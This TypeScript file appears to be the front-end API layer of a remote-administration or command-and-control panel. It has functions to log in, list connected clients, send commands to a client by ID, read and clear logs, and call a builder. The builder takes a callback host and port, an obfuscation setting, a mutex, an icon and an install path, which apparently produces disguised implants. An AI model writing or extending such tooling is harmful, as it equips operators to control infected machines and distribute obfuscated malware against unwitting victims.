import type { ClientDetailResponse, StatsResponse, LogEntry } from "./types.js";

function getCsrf(): string {
  const m = document.cookie.match(/(?:^|;\s*)hc_csrf=([^;]+)/);
  return m ? decodeURIComponent(m[1] ?? "") : "";
}

async function post<T>(url: string, body?: unknown): Promise<T> {
  const res = await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json", "X-CSRF-Token": getCsrf() },
    body: JSON.stringify(body ?? {}),
  });
  const data = (await res.json()) as T & { error?: string };
  if (!res.ok) throw new Error(data.error || "Request failed");
  return data;
}

export interface BuildConfig {
  host: string;
  port: number;
  format: string;
  obfuscation: string;
  icon: string;
  mutex: string;
  installPath: string;
  features: Record<string, boolean>;
}

export interface BuildResult {
  ok: true;
  filename: string;
  size: number;
  contents: string;
}

export const api = {
  async me(): Promise<boolean> {
    const res = await fetch("/api/me");
    return res.ok;
  },
  login(username: string, password: string) {
    return post<{ ok: true; user: string; csrf: string }>("/api/login", { username, password });
  },
  logout() {
    return post<{ ok: true }>("/api/logout");
  },
  async stats(): Promise<StatsResponse> {
    const res = await fetch("/api/stats");
    if (!res.ok) throw new Error("Not authorized");
    return (await res.json()) as StatsResponse;
  },
  async client(id: string): Promise<ClientDetailResponse> {
    const res = await fetch(`/api/client/${encodeURIComponent(id)}`);
    if (!res.ok) throw new Error("Client not found");
    return (await res.json()) as ClientDetailResponse;
  },
  async logs(): Promise<LogEntry[]> {
    const res = await fetch("/api/logs");
    if (!res.ok) throw new Error("Not authorized");
    const data = (await res.json()) as { ok: boolean; logs: LogEntry[] };
    return data.logs;
  },
  clearLogs() {
    return post<{ ok: true }>("/api/logs");
  },
  sendCommand(clientId: string, action: string) {
    return post<{ ok: true; result: string }>(`/api/command/${encodeURIComponent(clientId)}`, { action });
  },
  build(cfg: BuildConfig) {
    return post<BuildResult>("/api/build", cfg);
  },
};
